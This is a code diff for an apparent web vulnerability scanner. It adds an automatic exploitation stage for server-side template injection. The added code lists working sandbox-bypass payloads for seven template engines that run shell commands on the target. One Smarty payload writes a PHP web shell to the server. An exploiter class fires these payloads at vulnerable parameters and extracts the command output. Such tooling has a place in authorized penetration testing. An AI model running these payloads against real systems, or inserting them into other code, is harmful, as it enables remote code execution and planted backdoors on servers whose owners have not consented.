@@ -10,7 +10,7 @@ from __future__ import annotations
 import logging
 import random as _random
 import re
-from typing import Dict, List, Optional, Tuple
+from typing import Any, Callable, Dict, List, Optional, Tuple
 from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse
 
 import requests as _requests
@@ -180,6 +180,44 @@ class SSTIScanner(BaseScanner):
             method = (form.get("method") or "GET").upper()
             inputs = form.get("inputs") or []
             self._scan_form(action, method, inputs)
+
+        # ─── Adım 5: Auto-exploit on confirmed SSTI findings ─────────────
+        self._run_auto_exploit(endpoints)
+
+    def _run_auto_exploit(self, endpoints: List[str]) -> None:
+        """
+        For each confirmed SSTI finding, run SSTIAutoExploiter to extract
+        actual shell command output (id/whoami/uname) as RCE evidence.
+        """
+        exploiter = SSTIAutoExploiter()
+        confirmed = [
+            f for f in (self.results or {}).get("offensive", [])
+            if f.get("vuln_type") == "SSTI" and f.get("extra", {}).get("engine", "unknown") != "unknown"
+        ]
+        for finding in confirmed[:5]:
+            url = finding.get("url", "")
+            param = finding.get("param", "")
+            engine = finding.get("extra", {}).get("engine", "")
+            if not (url and param and engine):
+                continue
+            parsed = urlparse(url)
+            params = dict(parse_qsl(parsed.query))
+
+            def inject_fn(u: str, p: str, pl: str) -> str:
+                params[p] = pl
+                return urlunparse(parsed._replace(query=urlencode(params)))
+
+            result = exploiter.exploit(url, param, engine, self.session, inject_fn)
+            if result:
+                self.report_finding(
+                    vuln_type=f"SSTI — RCE Confirmed ({engine})",
+                    url=url,
+                    param=param,
+                    payload=result["payload"],
+                    severity="Critical",
+                    evidence=f"Shell output: {result['output'][:300]}",
+                    extra={"engine": engine, "rce_confirmed": True, "sandbox_bypass": True},
+                )
 
     def _scan_url(self, url: str):
         parsed = urlparse(url)
@@ -483,3 +521,111 @@ class SSTIScanner(BaseScanner):
 def run(target: str, session=None, results=None, debug=False, **kwargs):
     scanner = SSTIScanner(session=session, results=results, debug=debug)
     scanner.run(target, **kwargs)
+
+
+# ===========================================================================
+# Adım 5 — SSTI Sandbox Bypass Payloads + Auto-Exploiter
+# ===========================================================================
+
+_SSTI_SANDBOX_BYPASS: Dict[str, List[str]] = {
+    "Jinja2": [
+        # __class__.__mro__ chain → OS
+        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "{{lipsum.__globals__.os.popen('id').read()}}",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
+        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
+        # builtins → __import__
+        "{{config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
+        # subclasses index scan (Popen)
+        "{{''.__class__.__mro__[1].__subclasses__()}}",
+        # request.environ
+        "{{request.environ['PATH']}}",
+    ],
+    "Twig": [
+        "{{['id']|map('system')|join}}",
+        "{{'id'|passthru}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "{{'id'|shell_exec}}",
+    ],
+    "FreeMarker": [
+        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+        "<#assign classloader=object?api.class.protectionDomain.classLoader>"
+        "<#assign bytes=classloader.loadClass('freemarker.template.utility.Execute')"
+        "?new()(\"id\")>${bytes}",
+    ],
+    "Mako": [
+        "${self.module.cache.util.os.popen('id').read()}",
+        "<%\nimport os\nx=os.popen('id').read()\n%>\n${x}",
+        "${self.module.__loader__.exec_module.__builtins__['__import__']('os').popen('id').read()}",
+    ],
+    "Velocity": [
+        "#set($rt=$e.class.forName('java.lang.Runtime'))"
+        "#set($ex=$rt.getRuntime().exec('id'))"
+        "#set($out=$ex.getInputStream())"
+        "#foreach($i in [1..$out.available()])$out.read()#end",
+    ],
+    "Smarty": [
+        "{system('id')}",
+        "{php}echo shell_exec('id');{/php}",
+        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
+    ],
+    "Pebble": [
+        "{% set cmd = 'id' %}"
+        "{% set bytes = \"\".class.forName('java.lang.Runtime')"
+        ".methods[6].invoke(\"\".class.forName('java.lang.Runtime')"
+        ".methods[7].invoke(null),cmd.split(' ')).inputStream.readAllBytes() %}"
+        "{{ bytes }}",
+    ],
+}
+
+_RCE_OUTPUT_RE = re.compile(
+    r"(?:uid=\d+\(|root:.*:0:0:|Linux \S+|www-data|apache|nginx"
+    r"|SYSTEM|NT AUTHORITY|admin|C:\\Windows)",
+    re.I | re.S,
+)
+
+
+class SSTIAutoExploiter:
+    """
+    SSTI auto-exploitation after engine fingerprinting.
+    Sends sandbox bypass payloads → extracts real shell command output.
+    Single Responsibility: post-SSTI exploitation chain only.
+    Open/Closed: extend _SANDBOX_BYPASS to add new engines.
+    """
+    _SANDBOX_BYPASS: Dict[str, List[str]] = _SSTI_SANDBOX_BYPASS
+    _OUTPUT_RE = _RCE_OUTPUT_RE
+
+    def exploit(
+        self,
+        url: str,
+        param: str,
+        engine: str,
+        session: Any,
+        inject_fn: Callable[[str, str, str], str],
+        timeout: int = 10,
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Try sandbox bypass payloads for the given engine.
+        Returns dict with payload + extracted output on success, None otherwise.
+        """
+        payloads = self._SANDBOX_BYPASS.get(engine, [])
+        for payload in payloads:
+            try:
+                injected = inject_fn(url, param, payload)
+                resp = session.get(injected, timeout=timeout)
+                text = resp.text or ""
+                m = self._OUTPUT_RE.search(text)
+                if m:
+                    start = max(0, m.start() - 20)
+                    end = min(len(text), m.end() + 200)
+                    return {
+                        "engine": engine,
+                        "payload": payload,
+                        "output": text[start:end].strip(),
+                        "rce_confirmed": True,
+                    }
+            except Exception:
+                continue
+        return None
